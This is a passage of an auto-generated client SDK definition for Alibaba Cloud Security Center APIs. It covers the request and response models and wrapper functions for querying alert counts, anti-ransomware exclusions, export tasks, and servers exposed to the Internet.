  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  multiAccountActionType?: int32(name='MultiAccountActionType', description='The type of the accounts that you want to query. Default value: **0**. Valid values:

*   **0**: the current account.
*   **1**: all accounts.', example='0'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the asset', example='uuid'),
}

model DescribeEventLevelCountResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  eventLevels?: {
    remind?: int32(name='Remind', description='The number of alerts whose Emergency level is Reminder.', example='2'),
    serious?: int32(name='Serious', description='The number of alerts whose Emergency level is Urgent.', example='0'),
    suspicious?: int32(name='Suspicious', description='The number of alerts whose Emergency level is Suspicious.', example='1'),
  }(name='EventLevels', description='The statistics of alerts by risk level.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='CE8CA5EA-24EF-5D41-B735-53ACE7XXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeEventLevelCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeEventLevelCountResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of alert events by risk level.
 *
 * @param request DescribeEventLevelCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeEventLevelCountResponse
 */
async function describeEventLevelCountWithOptions(request: DescribeEventLevelCountRequest, runtime: Util.RuntimeOptions): DescribeEventLevelCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.multiAccountActionType)) {
    query['MultiAccountActionType'] = request.multiAccountActionType;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventLevelCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of alert events by risk level.
 *
 * @param request DescribeEventLevelCountRequest
 * @return DescribeEventLevelCountResponse
 */
async function describeEventLevelCount(request: DescribeEventLevelCountRequest): DescribeEventLevelCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventLevelCountWithOptions(request, runtime);
}

model DescribeEventOnStageRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeEventOnStageResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-E332241XXXXX'),
  securityEventStageResponse?: {
    securityEventOnStag?: map[string]any(name='SecurityEventOnStag', description='The platform that is supported by the feature of container threat detection. Valid values:

*   **container**
*   **linux**
*   **windows**'),
  }(name='SecurityEventStageResponse', description='The platforms that are supported by the feature of container threat detection.'),
}

model DescribeEventOnStageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeEventOnStageResponseBody(name='body'),
}

/**
 * @summary Queries the platforms that are supported by the feature of container threat detection.
 *
 * @param request DescribeEventOnStageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeEventOnStageResponse
 */
async function describeEventOnStageWithOptions(request: DescribeEventOnStageRequest, runtime: Util.RuntimeOptions): DescribeEventOnStageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventOnStage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the platforms that are supported by the feature of container threat detection.
 *
 * @param request DescribeEventOnStageRequest
 * @return DescribeEventOnStageResponse
 */
async function describeEventOnStage(request: DescribeEventOnStageRequest): DescribeEventOnStageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventOnStageWithOptions(request, runtime);
}

model DescribeExcludeSystemPathRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='20'),
}

model DescribeExcludeSystemPathResponseBody = {
  excludePaths?: [ 
    {
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**: Linux
*   **windows**: Windows', example='linux'),
      path?: string(name='Path', description='The absolute path to the directory.', example='/bin/'),
    }
  ](name='ExcludePaths', description='An array consisting of the directories that are excluded.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FBBEB173-1F43-505F-A876-C03ECDF6****'),
}

model DescribeExcludeSystemPathResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExcludeSystemPathResponseBody(name='body'),
}

/**
 * @summary Queries the directories that are excluded from anti-ransomware.
 *
 * @param request DescribeExcludeSystemPathRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExcludeSystemPathResponse
 */
async function describeExcludeSystemPathWithOptions(request: DescribeExcludeSystemPathRequest, runtime: Util.RuntimeOptions): DescribeExcludeSystemPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExcludeSystemPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the directories that are excluded from anti-ransomware.
 *
 * @param request DescribeExcludeSystemPathRequest
 * @return DescribeExcludeSystemPathResponse
 */
async function describeExcludeSystemPath(request: DescribeExcludeSystemPathRequest): DescribeExcludeSystemPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExcludeSystemPathWithOptions(request, runtime);
}

model DescribeExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.

> You can call the [ExportRecord](~~ExportRecord~~) operation to query the IDs of export tasks.

This parameter is required.', example='111'),
}

model DescribeExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='20'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task.

Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='health_check_export_20171123'),
  id?: long(name='Id', description='The ID of the export task.', example='131231'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the task result. The value is fixed as **success**, which indicates that the task is complete.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='16'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the exported Excel file.', example='100'),
}

model DescribeExportInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExportInfoResponseBody(name='body'),
}

/**
 * @summary Queries the progress of a task that exports your assets to an Excel file.
 *
 * @param request DescribeExportInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExportInfoResponse
 */
async function describeExportInfoWithOptions(request: DescribeExportInfoRequest, runtime: Util.RuntimeOptions): DescribeExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the progress of a task that exports your assets to an Excel file.
 *
 * @param request DescribeExportInfoRequest
 * @return DescribeExportInfoResponse
 */
async function describeExportInfo(request: DescribeExportInfoRequest): DescribeExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExportInfoWithOptions(request, runtime);
}

model DescribeExposedCheckWarningRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  typeName?: string(name='TypeName', description='The type of the baseline.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to obtain the types of baselines from the response parameter **TypeName**.', example='weak_password'),
  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='6541631a-7d47-41fd-9fef-9518113f****'),
}

model DescribeExposedCheckWarningResponseBody = {
  count?: int32(name='Count', description='The total number of entries returned.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD****'),
  warningList?: [ 
    {
      riskId?: long(name='RiskId', description='The ID of the baseline.

>  You can call the [DescribeCheckWarningSummary](https://help.aliyun.com/document_detail/116179.html) operation to query the IDs of baselines.', example='107'),
      riskName?: string(name='RiskName', description='The name of the baseline.', example='Weak password-Redis DB login weak password baseline'),
      subTypeAlias?: string(name='SubTypeAlias', description='The display name of the baseline sub type.', example='Redis DB login weak password baseline'),
      typeAlias?: string(name='TypeAlias', description='The display name of the baseline type.', example='Weak password'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1d35b031-ee4e-4e53-8b53-465ab712****'),
    }
  ](name='WarningList', description='An array that consists of the baseline risk items of the exposed server.'),
}

model DescribeExposedCheckWarningResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExposedCheckWarningResponseBody(name='body'),
}

/**
 * @summary Queries the weak password-related risks of a specified server that is exposed on the Internet.
 *
 * @param request DescribeExposedCheckWarningRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExposedCheckWarningResponse
 */
async function describeExposedCheckWarningWithOptions(request: DescribeExposedCheckWarningRequest, runtime: Util.RuntimeOptions): DescribeExposedCheckWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedCheckWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the weak password-related risks of a specified server that is exposed on the Internet.
 *
 * @param request DescribeExposedCheckWarningRequest
 * @return DescribeExposedCheckWarningResponse
 */
async function describeExposedCheckWarning(request: DescribeExposedCheckWarningRequest): DescribeExposedCheckWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedCheckWarningWithOptions(request, runtime);
}

model DescribeExposedInstanceCriteriaRequest {
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the account ID.', example='1232428423234****'),
  value?: string(name='Value', description='The value of the search condition. Fuzzy match is supported.

>  You can specify the name, ID, public IP address, private IP address, component, port, or IP address of an exposed asset.', example='id'),
}

model DescribeExposedInstanceCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='instanceId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: You must configure the search condition.
*   **select**: You must select a search condition from the **Values** list.', example='select'),
      values?: string(name='Values', description='The value of the search condition. This parameter is returned only when the value of the **Type** parameter is **select**.

>  If the value of the **Type** parameter is **input**, this parameter is empty.', example='i-bp19r0fdd39idxhf****'),
    }
  ](name='CriteriaList', description='The search conditions that are used to search for exposed assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeExposedInstanceCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExposedInstanceCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries the search conditions that are used to search for exposed assets.
 *
 * @param request DescribeExposedInstanceCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExposedInstanceCriteriaResponse
 */
async function describeExposedInstanceCriteriaWithOptions(request: DescribeExposedInstanceCriteriaRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the search conditions that are used to search for exposed assets.
 *
 * @param request DescribeExposedInstanceCriteriaRequest
 * @return DescribeExposedInstanceCriteriaResponse
 */
async function describeExposedInstanceCriteria(request: DescribeExposedInstanceCriteriaRequest): DescribeExposedInstanceCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceCriteriaWithOptions(request, runtime);
}

model DescribeExposedInstanceDetailRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the account ID.', example='1232428423234****'),
  uuid?: string(name='Uuid', description='The UUID of the server or the instance ID of the database that is exposed on the Internet.

>  You can call the [DescribeExposedInstanceList](~~DescribeExposedInstanceList~~) operation to query the UUIDs of servers or instance IDs of databases.

This parameter is required.', example='fc82b966-4d70-4e01-bf4f-aa4076a5****'),
}

model DescribeExposedInstanceDetailResponseBody = {
  exposedChains?: [ 
    {
      allVulList?: [ 
        {
          aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', description='The name of the vulnerability.', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **sca**: middleware vulnerabilities', example='sca'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='AllVulList', description='The information about all vulnerabilities on the server.'),
      cspmRiskList?: [ 
        {
          assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud asset. Valid values:

*   **0**: Elastic Compute Service (ECS).

    *   **100**: instance.

*   **3**: ApsaraDB RDS.

    *   **0**: instance.

*   **4**: ApsaraDB for MongoDB (MongoDB).

    *   **0**: instance.

*   **5**: ApsaraDB for Redis (Redis).

    *   **0**: instance.', example='100'),
          assetSubTypeName?: string(name='AssetSubTypeName', description='The subtype name of the cloud asset. Valid values:

*   **INSTANCE**: MongoDB instance, Apsara DB for RDS instance, and ApsaraDB for Redis instance.
*   **ECS_INSTANCE**: ECS instance.', example='INSTANCE'),
          assetType?: int32(name='AssetType', description='The instance type. Valid values:

*   0: an ECS instance.
*   3: an ApsaraDB RDS instance.
*   4: an ApsaraDB for MongoDB instance.
*   5: an ApsaraDB for Redis instance.', example='0'),
          assetTypeName?: string(name='AssetTypeName', description='The name of the cloud asset type. Valid values:

*   **ECS**
*   **RDS**
*   **KVSTORE**
*   **MONGODB**', example='ECS'),
          checkName?: string(name='CheckName', description='The name of the check item.', example='Create Alert Rule'),
          instanceId?: string(name='InstanceId', description='The instance ID.', example='i-bp14ggqzi9k6ocfb****'),
          regionId?: string(name='RegionId', description='The region ID.', example='cn-hangzhou'),
          riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', example='HIGH'),
          vendor?: int32(name='Vendor', description='The type of the cloud asset by source. Valid values:

*   **0**: an asset provided by Alibaba Cloud.', example='0'),
        }
      ](name='CspmRiskList', description='The list of configuration risks.'),
      exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The IP address of the server or the public endpoint of the database.', example='47.99.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the server or database is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an Elastic Compute Service (ECS) instance.
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance.
*   **EIP**: an elastic IP address (EIP).
*   **DNAT**: the Network Address Translation (NAT) gateway that connects to the Internet by using the Destination Network Address Translation (DNAT) feature
*   **DB_CONNECTION**: the public endpoint of a database.', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the value of the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, this parameter is empty.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.
*   If the value of the ExposureType parameter is **DB_CONNECTION**, the value of this parameter is the ID of the database.', example='eip-bp1bkgowzam49rld3****'),
      groupNo?: string(name='GroupNo', description='The server group to which the server belongs.', example='sg-bp1iw5enua6gf5i2xr7z'),
      instanceId?: string(name='InstanceId', description='The instance ID.', example='i-bp116qem8npvchqc****'),
      instanceName?: string(name='InstanceName', description='The instance name.', example='worker-k8s-for-cs-c929ee2a145214f89a8b248005be5****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.99.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      realVulList?: [ 
        {
          aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', description='The name of the vulnerability.', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **sca**: middleware vulnerabilities', example='sca'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='RealVulList', description='The information about the vulnerabilities that are exposed on the Internet and can be exploited by attackers.'),
      regionId?: string(name='RegionId', description='The region ID.

>  For information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server or the instance ID of the database.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
    }
  ](name='ExposedChains', description='The list of exposure details of the server or database.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C590482B-54A7-4273-8115-9DBE2DE46B26'),
}

model DescribeExposedInstanceDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExposedInstanceDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of a specified server that is exposed on the Internet.
 *
 * @param request DescribeExposedInstanceDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExposedInstanceDetailResponse
 */
async function describeExposedInstanceDetailWithOptions(request: DescribeExposedInstanceDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a specified server that is exposed on the Internet.
 *
 * @param request DescribeExposedInstanceDetailRequest
 * @return DescribeExposedInstanceDetailResponse
 */
async function describeExposedInstanceDetail(request: DescribeExposedInstanceDetailRequest): DescribeExposedInstanceDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceDetailWithOptions(request, runtime);
}

model DescribeExposedInstanceListRequest {
  assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: an Elastic Compute Service (ECS) instance.
*   **3**: an ApsaraDB RDS instance.
*   **4**: an ApsaraDB for MongoDB instance.
*   **5**: an ApsaraDB for Redis instance.', example='0'),
  cspmStatus?: boolean(name='CspmStatus', description='Specifies whether the asset has Cloud Security Posture Management (CSPM) risks. Valid values:

*   **true**
*   **false**', example='true'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl'),
  exposureIp?: string(name='ExposureIp', description='The public IP address of the server or the public endpoint of the database.', example='116.12.XX.XX'),
  exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
  groupId?: long(name='GroupId', description='The ID of the server group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='9535356'),
  healthStatus?: boolean(name='HealthStatus', description='Specifies whether the asset has weak password risks. Valid values:

*   **true**
*   **false**', example='Unhealthy'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-bp1g6wxdwps7s9dz****'),
  instanceName?: string(name='InstanceName', description='The name of the asset.', example='abc_centos7.2_005'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the ID.', example='16670360956*****'),
  vulStatus?: boolean(name='VulStatus', description='Specifies whether the asset has vulnerabilities. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeExposedInstanceListResponseBody = {
  exposedInstances?: [ 
    {
      asapVulCount?: int32(name='AsapVulCount', description='The number of high-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      assetType?: int32(name='AssetType', description='The type of the asset. Valid values:

*   **0**: an ECS instance.
*   **1**: a SLB instance.
*   **2**: a NAT gateway.
*   **3**: an ApsaraDB RDS instance.
*   **4**: an ApsaraDB for MongoDB instance.
*   **5**: an ApsaraDB for Redis instance.
*   **6**: a container image.
*   **7**: a container.', example='0'),
      cloudAssetInfo?: string(name='CloudAssetInfo', description='The JSON string that specifies the information about a database asset, which contains the following fields.

*   assetSubType: the asset subtype.
*   assetSubTypeName: the name of the asset subtype.
*   assetType: the type of the asset.
*   assetTypeName: the name of the asset type.
*   vendor: the service provider of the asset.', example='{assetSubTypeName":"INSTANCE","assetType":3,"assetTypeName":"RDS","vendor":0}'),
      cspmAlarmCount?: int32(name='CspmAlarmCount', description='The number of CSPM risks.', example='0'),
      exploitHealthCount?: int32(name='ExploitHealthCount', description='The number of weak password risks.', example='0'),
      exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The public IP address that is exposed on the Internet.', example='116.12.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an ECS instance.
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance.
*   **EIP**: an elastic IP address (EIP).
*   **DNAT**: the NAT gateway that connects to the Internet by using the Destination Network Address Translation (DNAT) feature.
*   **DB_CONNECTION**: the public endpoint of a database.', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the value of the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, this parameter is empty.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.
*   If the value of the ExposureType parameter is **DB_CONNECTION**, the value of this parameter is the ID of the database.', example='i-ew11313a****'),
      groupId?: long(name='GroupId', description='The ID of the server group.', example='9469268'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='testGroup'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-bp1g6wxdwps7s9dz****'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='abc_centos7.2_005'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='116.12.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      laterVulCount?: int32(name='LaterVulCount', description='The number of medium-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      nntfVulCount?: int32(name='NntfVulCount', description='The number of low-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.

